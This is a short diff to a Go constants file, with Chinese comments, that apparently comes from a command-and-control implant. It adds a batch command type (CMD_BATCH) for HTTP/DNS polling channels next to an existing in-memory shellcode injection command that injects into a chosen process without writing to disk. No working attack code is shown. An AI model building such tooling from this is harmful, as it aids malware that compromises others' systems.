@@ -124,4 +124,9 @@ const (
 	// 内存注入通道（A9，须与服务端 pkg/command/cmdType.go 一致）
 	// 纯内存接收分块 shellcode 并注入（不落盘；替代文件路径注入）
 	INJECT_MEM = 127 // 内存注入（requestId|total|seq|pidLen|pid|techLen|tech|chunk）
+
+	// 批量命令包装（B5，须与服务端 pkg/command/cmdType.go 一致）：
+	// 仅轮询协议(HTTP/DNS)批量下发时使用。帧格式 count(4) + N×[len(4)|cmd]，
+	// cmd 为完整单条命令帧(cmdType(4)|cmdBuf)。旧服务端永不下发此号。
+	CMD_BATCH = 128
 )
